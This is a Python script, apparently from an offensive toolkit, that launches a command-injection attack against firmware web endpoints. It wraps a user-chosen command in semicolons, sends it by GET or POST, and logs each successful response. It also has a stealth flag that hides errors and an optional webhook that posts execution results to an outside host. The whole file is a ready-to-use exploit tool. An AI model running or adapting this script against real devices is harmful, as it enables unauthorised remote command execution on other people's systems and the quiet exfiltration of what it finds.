# modules/exploits/firmware_rce_launcher.py

import requests
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1203"  # Exploitation of Vulnerability in Firmware or Web App

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def send_rce_payload(target_url, cmd, method="GET", stealth=False, webhook=None):
    payload = f";{cmd};"
    try:
        if method.upper() == "GET":
            r = requests.get(target_url + payload, timeout=5)
        else:
            r = requests.post(target_url, data={"input": payload}, timeout=5)
        result = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_url,
            "type": "firmware_rce",
            "cmd": cmd,
            "response_preview": r.text[:120],
            "ttp": MITRE_TTP
        }
        if r.status_code == 200:
            print("[+] RCE executed successfully.")
            print(r.text[:200])
            log_result(result)
            if webhook:
                try:
                    requests.post(webhook, json=result, timeout=3)
                except Exception:
                    if not stealth:
                        print("[!] Webhook delivery failed.")
        else:
            print(f"[!] HTTP {r.status_code}")
    except Exception as e:
        if not stealth:
            print(f"[!] Exception: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Firmware RCE Launcher - Enhanced")
    parser.add_argument("--url", required=True, help="Target vulnerable firmware endpoint")
    parser.add_argument("--cmd", default="id", help="Command to execute remotely")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--stealth", action="store_true", help="Suppress output and errors")
    parser.add_argument("--webhook", help="Webhook for result reporting")
    args = parser.parse_args()

    send_rce_payload(args.url, args.cmd, args.method, args.stealth, args.webhook)
